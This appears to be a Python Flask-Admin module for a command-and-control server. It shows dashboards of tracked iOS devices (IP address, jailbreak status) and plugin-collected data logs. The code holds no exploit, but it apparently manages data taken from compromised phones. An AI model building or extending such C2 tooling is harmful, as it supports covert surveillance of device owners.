"""
Admin Panel Routes
Custom Flask-Admin views for devices and logs
"""

import base64
from flask import request, current_app
from flask_admin import AdminIndexView, expose
from flask_admin.contrib.sqla import ModelView


def _is_admin_authenticated() -> bool:
    """Check Basic Auth credentials against config."""
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Basic '):
        return False
    try:
        credentials = base64.b64decode(auth_header[6:]).decode('utf-8')
        username, password = credentials.split(':', 1)
        config = current_app.config
        return (
            username == config.get('ADMIN_USERNAME')
            and password == config.get('ADMIN_PASSWORD')
        )
    except Exception:
        return False


class C2AdminIndexView(AdminIndexView):
    def is_accessible(self):
        return _is_admin_authenticated()

    @expose('/')
    def index(self):
        Device = current_app.Device
        Log = current_app.Log
        stats = {
            'total_devices': Device.query.count(),
            'online_devices': Device.query.filter_by(is_active=True).count(),
            'total_logs': Log.query.count(),
            'jailbroken': Device.query.filter_by(is_jailbroken=True).count(),
        }
        devices = Device.query.order_by(Device.last_seen.desc()).all()
        recent_logs = Log.query.order_by(Log.timestamp.desc()).limit(15).all()
        return self.render('admin/index.html', stats=stats, devices=devices, recent_logs=recent_logs)


class DeviceModelView(ModelView):
    """Custom view for Device model"""

    def is_accessible(self):
        return _is_admin_authenticated()

    @expose('/details/')
    def details_view(self):
        """Override to inject sorted logs into template context."""
        from sqlalchemy import text as sa_text
        Log = current_app.Log

        model = self.get_one(request.args.get('id'))
        if model is None:
            from flask import abort
            abort(404)

        recent_logs = (
            Log.query
            .filter_by(device_id=model.id)
            .order_by(Log.timestamp.desc())
            .limit(100)
            .all()
        )

        return self.render(
            self.details_template,
            model=model,
            recent_logs=recent_logs,
            details_columns=self._details_columns,
            get_value=self.get_detail_value,
            return_url=self.get_url('.index_view'),
        )

    column_list = ['id', 'device_name', 'ip_address', 'last_seen', 'is_active', 'model', 'system_version']
    column_sortable_list = ['id', 'device_name', 'ip_address', 'last_seen']
    column_searchable_list = ['device_name', 'ip_address']
    column_filters = ['device_name', 'ip_address', 'last_seen', 'is_active']
    column_default_sort = ('last_seen', True)

    can_create = False
    can_edit = True
    can_delete = True
    can_view_details = True

    details_template = 'admin/device_details.html'

    column_labels = {
        'device_name': 'Device',
        'ip_address': 'IP Address',
        'last_seen': 'Last Seen',
        'is_active': 'Active',
        'model': 'Model',
        'system_version': 'iOS Version'
    }

    column_formatters = {
        'is_active': lambda v, c, m, p: '● Active' if m.is_active else '○ Inactive'
    }


class LogModelView(ModelView):
    """Custom view for Log model"""

    def is_accessible(self):
        return _is_admin_authenticated()

    column_list = ['id', 'device_id', 'plugin_name', 'data_preview', 'timestamp']
    column_sortable_list = ['id', 'plugin_name', 'timestamp']
    column_searchable_list = ['plugin_name', 'data']
    column_filters = ['plugin_name', 'timestamp']
    column_default_sort = ('timestamp', True)

    can_create = False
    can_edit = False
    can_delete = True
    can_view_details = True

    column_labels = {
        'plugin_name': 'Plugin',
        'data_preview': 'Data Preview',
        'timestamp': 'Time'
    }

    def _data_preview(view, context, model, name):
        if model.data:
            return model.data[:100] + '...' if len(model.data) > 100 else model.data
        return ''

    column_formatters = {
        'data_preview': _data_preview
    }
